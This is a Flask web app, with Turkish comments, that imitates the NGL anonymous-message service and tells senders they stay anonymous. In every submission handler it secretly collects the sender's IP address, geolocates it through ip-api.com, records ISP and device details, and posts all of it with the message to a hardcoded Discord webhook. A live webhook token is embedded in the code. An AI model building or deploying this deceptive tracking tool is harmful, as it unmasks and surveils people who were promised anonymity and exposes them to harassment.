from flask import Flask, request, render_template_string, redirect
import logging
import requests
import os
from datetime import datetime

# Logging ayarları – hem dosyaya hem Render konsoluna yazsın
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s',
    handlers=[
        logging.FileHandler('ngl_hacker.log', encoding='utf-8'),
        logging.StreamHandler()  # Render Logs'ta görünür
    ]
)

app = Flask(__name__)

# Ana sayfa HTML – kullanıcı adı + mesaj kutusu bir arada
HOME_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NGL - Anonim Mesaj</title>
    <style>
        body {
            background: linear-gradient(135deg, #000000, #1a0033);
            color: white;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 20px;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        h1 {
            font-size: 4rem;
            font-weight: 800;
            margin-bottom: 20px;
            background: linear-gradient(90deg, #ff00cc, #3333ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        input[type="text"], textarea {
            width: 80%;
            max-width: 500px;
            padding: 15px;
            font-size: 1.2rem;
            border: none;
            border-radius: 16px;
            background: rgba(255,255,255,0.1);
            color: white;
            margin-bottom: 20px;
        }
        input[type="text"]::placeholder, textarea::placeholder { color: rgba(255,255,255,0.6); }
        textarea {
            height: 120px;
            resize: none;
        }
        button {
            padding: 16px 50px;
            background: linear-gradient(90deg, #ff00cc, #3333ff);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 1.3rem;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
        }
        button:hover { transform: scale(1.05); }
        .info {
            margin-top: 30px;
            font-size: 0.9rem;
            opacity: 0.7;
            color: #ccc;
        }
        .success {
            font-size: 2rem;
            margin-top: 50px;
            animation: fadeIn 1s;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>
    {% if success %}
        <div class="success">✅ Mesajın gönderildi!</div>
        <p>gizlilik esastır.</p>
    {% else %}
        <h1>@{{ username if username else 'NGL Anonim' }}</h1>
        <p>Anonim mesaj gönder</p>
        <form method="POST">
            <input type="text" name="username" placeholder="Kullanıcı adın (isteğe bağlı)" value="{{ username }}" autocomplete="off"><br>
            <textarea name="message" placeholder="Buraya yaz..." required></textarea><br>
            <button type="submit">Gönder</button>
        </form>
        <div class="info">Kullanıcı adı boş bırakılırsa anonim kalır</div>
    {% endif %}
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def home():
    username = request.args.get('username', '') or request.form.get('username', '')
    if request.method == 'POST':
        msg = request.form.get('message', '').strip()
        if msg:
            client_ip = None
            if 'CF-Connecting-IP' in request.headers:
                client_ip = request.headers['CF-Connecting-IP'].strip()
            elif 'X-Forwarded-For' in request.headers:
                forwarded = request.headers['X-Forwarded-For'].split(',')[0].strip()
                if forwarded and forwarded != 'unknown':
                    client_ip = forwarded
            elif 'X-Real-IP' in request.headers:
                client_ip = request.headers['X-Real-IP'].strip()
            else:
                client_ip = request.remote_addr or '127.0.0.1'

            user_agent = request.headers.get('User-Agent', 'Bilinmiyor')[:200]

            location = "Konum alınamadı"
            isp = "Bilinmiyor"
            if client_ip not in ['127.0.0.1', '::1']:
                try:
                    geo = requests.get(f"http://ip-api.com/json/{client_ip}", timeout=6).json()
                    if geo.get('status') == 'success':
                        city = geo.get('city', 'Bilinmiyor')
                        region = geo.get('regionName', '')
                        country = geo.get('country', '')
                        location = f"{city}, {region}, {country}"
                        isp = geo.get('isp', 'Bilinmiyor')
                except:
                    pass

            log_entry = f"@{username or 'Anonim'} | MESAJ: {msg} | IP: {client_ip} | KONUM: {location} | ISP: {isp} | UA: {user_agent}"
            logging.info(log_entry)
            print(f"[YENİ MESAJ] {log_entry}")

            discord_webhook = "https://discordapp.com/api/webhooks/1467529164444668037/u22KPPoEIghrxWupLJrwcDDUV3F8u-3b_Y_wOTOqpP7rA7lUJH6aKL1P85rUeuNAhq8z"  # ← kendi webhook'unu koy

            if discord_webhook:
                # 1. Kutusu: Sadece mesaj + kullanıcı adı (Instagram için)
                embed_mesaj = {
                    "title": "Yeni Anonim Mesaj! 📩",
                    "description": f"**{msg}**",
                    "color": 0x9B59B6,  # mor-pembe
                    "fields": [
                        {"name": "Gönderen", "value": f"@{username or 'Anonim'}", "inline": True}
                    ],
                    "footer": {
                        "text": "sent with ♥ from team NGL",
                        "icon_url": ""  # NGL logosu linki koyabilirsin
                    },
                    "timestamp": datetime.now().isoformat()
                }

                # 2. Kutusu: Tam log (senin takip için)
                embed_log = {
                    "title": "Mesaj Logu 🔍",
                    "color": 0x2C3E50,  # koyu
                    "fields": [
                        {"name": "Kullanıcı Adı", "value": f"@{username or 'Anonim'}", "inline": True},
                        {"name": "Mesaj", "value": msg, "inline": False},
                        {"name": "IP", "value": client_ip, "inline": True},
                        {"name": "Konum", "value": location, "inline": True},
                        {"name": "ISP", "value": isp, "inline": True},
                        {"name": "Cihaz", "value": user_agent[:100], "inline": False}
                    ],
                    "footer": {
                        "text": "Zaman: " + datetime.now().strftime("%d.%m.%Y %H:%M:%S")
                    }
                }

                payload = {"embeds": [embed_mesaj, embed_log]}

                try:
                    requests.post(discord_webhook, json=payload)
                    logging.info("[DISCORD] 2 kutu gönderildi (mesaj + log)")
                except Exception as e:
                    logging.error(f"[DISCORD HATASI] {str(e)}")

            return render_template_string(HOME_HTML, username=username, success=True)

    return render_template_string(HOME_HTML, username=username, success=False)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
